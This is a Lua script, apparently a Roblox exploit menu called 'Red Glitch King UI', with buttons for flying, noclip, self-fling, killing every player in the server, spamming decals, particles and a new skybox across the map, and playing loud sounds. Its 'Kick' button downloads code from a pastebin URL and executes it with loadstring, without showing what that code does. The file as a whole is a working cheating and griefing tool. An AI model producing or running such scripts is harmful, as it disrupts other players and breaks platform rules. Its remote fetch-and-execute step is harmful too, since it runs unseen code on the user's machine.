local player = game.Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local root = character:WaitForChild("HumanoidRootPart")

local gui = Instance.new("ScreenGui")
gui.Name = "RedGlitchKingUI"
gui.ResetOnSpawn = false
gui.Parent = player:WaitForChild("PlayerGui")

local frame = Instance.new("Frame")
frame.Size = UDim2.new(0, 350, 0, 250)
frame.Position = UDim2.new(0.5, -175, 0.5, -125)
frame.BackgroundColor3 = Color3.fromRGB(30, 0, 0)
frame.BorderSizePixel = 0
frame.Active = true
frame.Draggable = true
frame.Parent = gui

local stroke = Instance.new("UIStroke")
stroke.Thickness = 3
stroke.Color = Color3.fromRGB(255, 0, 0)
stroke.Parent = frame

local title = Instance.new("TextLabel")
title.Size = UDim2.new(1, 0, 0, 30)
title.Text = "Red Glitch King UI"
title.BackgroundColor3 = Color3.fromRGB(60, 0, 0)
title.TextColor3 = Color3.fromRGB(255, 0, 0)
title.Font = Enum.Font.Code
title.TextSize = 22
title.Parent = frame

local tabBar = Instance.new("Frame")
tabBar.Size = UDim2.new(1, 0, 0, 30)
tabBar.Position = UDim2.new(0, 0, 0, 30)
tabBar.BackgroundColor3 = Color3.fromRGB(40, 0, 0)
tabBar.Parent = frame

local UIList = Instance.new("UIListLayout")
UIList.FillDirection = Enum.FillDirection.Horizontal
UIList.Parent = tabBar

local function createTabButton(text)
    local btn = Instance.new("TextButton")
    btn.Size = UDim2.new(0, 100, 1, 0)
    btn.BackgroundColor3 = Color3.fromRGB(80, 0, 0)
    btn.TextColor3 = Color3.fromRGB(255, 0, 0)
    btn.Font = Enum.Font.Code
    btn.TextSize = 20
    btn.Text = text
    btn.Parent = tabBar
    return btn
end

local page1Btn = createTabButton("Page 1")
local page2Btn = createTabButton("Page 2")
local page3Btn = createTabButton("Page 3")

local function createTabContent()
    local tab = Instance.new("Frame")
    tab.Size = UDim2.new(1, -10, 1, -70)
    tab.Position = UDim2.new(0, 5, 0, 65)
    tab.BackgroundTransparency = 1
    tab.Visible = false
    tab.Parent = frame
    return tab
end

local page1 = createTabContent()
local page2 = createTabContent()
local page3 = createTabContent()

local function showTab(tab)
    page1.Visible = false
    page2.Visible = false
    page3.Visible = false
    tab.Visible = true
end

showTab(page1)

------------------------------------------------------
-- FLY
------------------------------------------------------
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")
local UIS = game:GetService("UserInputService")

local player = Players.LocalPlayer

local function getRoot()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

local flying = false
local bv, bg

-- Key states
local keys = {
    W = false,
    A = false,
    S = false,
    D = false,
    Shift = false
}

-- Base speeds
local normalSpeed = 50
local boostSpeed = 120

local flyButton = Instance.new("TextButton")
flyButton.Size = UDim2.new(0, 200, 0, 40)
flyButton.Position = UDim2.new(0, 50, 0, 20)
flyButton.Text = "Toggle Fly"
flyButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
flyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
flyButton.Font = Enum.Font.Code
flyButton.TextSize = 22
flyButton.Parent = page1

flyButton.MouseButton1Click:Connect(function()
    flying = not flying
    local root = getRoot()

    if flying then
        bv = Instance.new("BodyVelocity")
        bv.MaxForce = Vector3.new(1e6, 1e6, 1e6)
        bv.Velocity = Vector3.zero
        bv.Parent = root

        bg = Instance.new("BodyGyro")
        bg.MaxTorque = Vector3.new(1e6, 1e6, 1e6)
        bg.CFrame = workspace.CurrentCamera.CFrame
        bg.Parent = root
    else
        if bv then bv:Destroy() end
        if bg then bg:Destroy() end
    end
end)

-- Key detection
UIS.InputBegan:Connect(function(input, gp)
    if gp then return end
    if input.KeyCode == Enum.KeyCode.W then keys.W = true end
    if input.KeyCode == Enum.KeyCode.A then keys.A = true end
    if input.KeyCode == Enum.KeyCode.S then keys.S = true end
    if input.KeyCode == Enum.KeyCode.D then keys.D = true end
    if input.KeyCode == Enum.KeyCode.LeftShift then keys.Shift = true end
end)

UIS.InputEnded:Connect(function(input)
    if input.KeyCode == Enum.KeyCode.W then keys.W = false end
    if input.KeyCode == Enum.KeyCode.A then keys.A = false end
    if input.KeyCode == Enum.KeyCode.S then keys.S = false end
    if input.KeyCode == Enum.KeyCode.D then keys.D = false end
    if input.KeyCode == Enum.KeyCode.LeftShift then keys.Shift = false end
end)

-- Flight movement
RunService.Heartbeat:Connect(function()
    if flying and bv and bg then
        local root = getRoot()
        local cam = workspace.CurrentCamera.CFrame

        bg.CFrame = cam

        local moveDir = Vector3.zero

        if keys.W then moveDir += cam.LookVector end
        if keys.S then moveDir -= cam.LookVector end
        if keys.A then moveDir -= cam.RightVector end
        if keys.D then moveDir += cam.RightVector end

        local speed = keys.Shift and boostSpeed or normalSpeed

        if moveDir.Magnitude > 0 then
            bv.Velocity = moveDir.Unit * speed
        else
            bv.Velocity = Vector3.zero -- Hover in place
        end
    end
end)

------------------------------------------------------
-- SKYBOX
------------------------------------------------------
local skyboxButton = Instance.new("TextButton")
skyboxButton.Size = UDim2.new(0, 200, 0, 40)
skyboxButton.Position = UDim2.new(0, 50, 0, 20)
skyboxButton.Text = "Change Skybox"
skyboxButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
skyboxButton.TextColor3 = Color3.fromRGB(255, 255, 255)
skyboxButton.Font = Enum.Font.Code
skyboxButton.TextSize = 22
skyboxButton.Parent = page2

skyboxButton.MouseButton1Click:Connect(function()
    local sky = Instance.new("Sky")
    sky.SkyboxBk = "rbxassetid://116838267742664"
    sky.SkyboxDn = "rbxassetid://116838267742664"
    sky.SkyboxFt = "rbxassetid://116838267742664"
    sky.SkyboxLf = "rbxassetid://116838267742664"
    sky.SkyboxRt = "rbxassetid://116838267742664"
    sky.SkyboxUp = "rbxassetid://116838267742664"
    sky.Parent = game.Lighting
end)

------------------------------------------------------
-- FLING YOURSELF
------------------------------------------------------
local Players = game:GetService("Players")
local player = Players.LocalPlayer

local flingButton = Instance.new("TextButton")
flingButton.Size = UDim2.new(0, 200, 0, 40)
flingButton.Position = UDim2.new(0, 50, 0, 20)
flingButton.Text = "Fling Yourself"
flingButton.BackgroundColor3 = Color3.fromRGB(140, 0, 0)
flingButton.TextColor3 = Color3.fromRGB(255, 255, 255)
flingButton.Font = Enum.Font.Code
flingButton.TextSize = 22
flingButton.Parent = page3

local function getRoot()
    local char = player.Character or player.CharacterAdded:Wait()
    return char:WaitForChild("HumanoidRootPart")
end

flingButton.MouseButton1Click:Connect(function()
    local root = getRoot()
    root.Velocity = Vector3.new(0, 200, 0)
end)

------------------------------------------------------
-- NOCLIP (ADDED)
------------------------------------------------------
local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer

local noclip = false
local parts = {}

local function updateParts()
    parts = {}
    local char = player.Character or player.CharacterAdded:Wait()
    for _, v in ipairs(char:GetChildren()) do
        if v:IsA("BasePart") then
            table.insert(parts, v)
        end
    end
end

-- Initial load
updateParts()

-- Update parts whenever you respawn
player.CharacterAdded:Connect(function(char)
    char:WaitForChild("HumanoidRootPart")
    task.wait(0.1)
    updateParts()
end)

local noclipButton = Instance.new("TextButton")
noclipButton.Size = UDim2.new(0,200,0,40)
noclipButton.Position = UDim2.new(0,50,0,70)
noclipButton.Text = "Toggle Noclip"
noclipButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
noclipButton.TextColor3 = Color3.fromRGB(255,255,255)
noclipButton.Font = Enum.Font.Code
noclipButton.TextSize = 22
noclipButton.Parent = page3

noclipButton.MouseButton1Click:Connect(function()
    noclip = not noclip
end)

RunService.Stepped:Connect(function()
    if noclip then
        for _, part in ipairs(parts) do
            part.CanCollide = false
        end
    else
        for _, part in ipairs(parts) do
            part.CanCollide = true
        end
    end
end)

------------------------------------------------------
-- Kill All (ADDED)
------------------------------------------------------
local killall = false
local parts = {}

local function updateParts()
    parts = {}
    local char = player.Character
    if not char then return end
    for _, v in pairs(char:GetChildren()) do
        if v:IsA("BasePart") then
            table.insert(parts, v)
        end
    end
end

updateParts()
player.CharacterAdded:Connect(updateParts)

local killallButton = Instance.new("TextButton")
killallButton.Size = UDim2.new(0,200,0,40)
killallButton.Position = UDim2.new(0,50,0,120)
killallButton.Text = "Kill All"
killallButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
killallButton.TextColor3 = Color3.fromRGB(255,255,255)
killallButton.Font = Enum.Font.Code
killallButton.TextSize = 22
killallButton.Parent = page3

killallButton.MouseButton1Click:Connect(function()
    for _, player in pairs(game.Players:GetPlayers()) do
     if player.Character and player.Character:FindFirstChild("Humanoid") then
      player.Character.Humanoid.Health = 0
     end
    end
end)

------------------------------------------------------
-- Decal Spam (FIXED)
------------------------------------------------------
local ID = 116838267742664
local Skybox = true
local particle = true

local decalspamButton = Instance.new("TextButton")
decalspamButton.Size = UDim2.new(0,200,0,40)
decalspamButton.Position = UDim2.new(0,50,0,70)
decalspamButton.Text = "Decal Spam"
decalspamButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
decalspamButton.TextColor3 = Color3.fromRGB(255,255,255)
decalspamButton.Font = Enum.Font.Code
decalspamButton.TextSize = 22
decalspamButton.Parent = page2

decalspamButton.MouseButton1Click:Connect(function()
    for i,v in pairs (game.Workspace:GetChildren()) do
        if v:IsA("Part") then
            for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
                local decal = Instance.new("Decal")
                decal.Texture = "rbxassetid://" .. ID
                decal.Face = face
                decal.Parent = v
            end
        end
    end

    for i,v in pairs (game.Workspace:GetChildren()) do
        if v:IsA("Model") then
            for _,z in pairs (v:GetChildren()) do
                if z:IsA("Part") then
                    for _,face in ipairs(Enum.NormalId:GetEnumItems()) do
                        local decal = Instance.new("Decal")
                        decal.Texture = "rbxassetid://" .. ID
                        decal.Face = face
                        decal.Parent = z
                    end
                end
            end
        end
    end

    if Skybox == true then
        local sky = Instance.new("Sky")
        sky.Parent = game.Lighting
        sky.SkyboxBk = "rbxassetid://" .. ID
        sky.SkyboxDn = "rbxassetid://" .. ID
        sky.SkyboxFt = "rbxassetid://" .. ID
        sky.SkyboxLf = "rbxassetid://" .. ID
        sky.SkyboxRt = "rbxassetid://" .. ID
        sky.SkyboxUp = "rbxassetid://" .. ID
    end

    if particle == true then
        for i,v in pairs (game.Workspace:GetChildren()) do
            if v:IsA("Part") then
                local particle = Instance.new("ParticleEmitter")
                particle.Texture = "rbxassetid://" .. ID
                particle.Parent = v
                particle.Rate = 200
            elseif v:IsA("Model") then
                for _,z in pairs (v:GetChildren()) do
                    if z:IsA("Part") then
                        local particle2 = Instance.new("ParticleEmitter")
                        particle2.Texture = "rbxassetid://" .. ID
                        particle2.Parent = z
                        particle2.Rate = 200
                    end
                end
            end
        end
    end
end)

------------------------------------------------------
-- Sound (FIXED)
------------------------------------------------------
local ids = {103215672097028,103215672097028,103215672097028,103215672097028,103215672097028}

local soundButton = Instance.new("TextButton")
soundButton.Size = UDim2.new(0,200,0,40)
soundButton.Position = UDim2.new(0,50,0,120)
soundButton.Text = "Sound"
soundButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
soundButton.TextColor3 = Color3.fromRGB(255,255,255)
soundButton.Font = Enum.Font.Code
soundButton.TextSize = 22
soundButton.Parent = page2

soundButton.MouseButton1Click:Connect(function()
    local player = game.Players.LocalPlayer
    local character = player.Character or player.CharacterAdded:Wait()
    local head = character:WaitForChild("Head")

    local sound = Instance.new("Sound")
    sound.Parent = head
    sound.SoundId = "rbxassetid://" .. ids[math.random(1,#ids)]
    sound.MaxDistance = 10000
    sound.Volume = 3
    sound:Play()

    task.delay(5, function()
        sound:Stop()
        sound:Destroy()
    end)
end)

-- Kick Button

local kickButton = Instance.new("TextButton")
kickButton.Size = UDim2.new(0,200,0,40)
kickButton.Position = UDim2.new(0,50,0,70)
kickButton.Text = "Kick"
kickButton.BackgroundColor3 = Color3.fromRGB(140,0,0)
kickButton.TextColor3 = Color3.fromRGB(255,255,255)
kickButton.Font = Enum.Font.Code
kickButton.TextSize = 22
kickButton.Parent = page1

kickButton.MouseButton1Click:Connect(function()
    loadstring(game:HttpGet("https://pastebin.com/raw/ZXAZyL3q",true))()
end)

------------------------------------------------------
-- TAB SWITCHING
------------------------------------------------------
page1Btn.MouseButton1Click:Connect(function() showTab(page1) end)
page2Btn.MouseButton1Click:Connect(function() showTab(page2) end)
page3Btn.MouseButton1Click:Connect(function() showTab(page3) end)
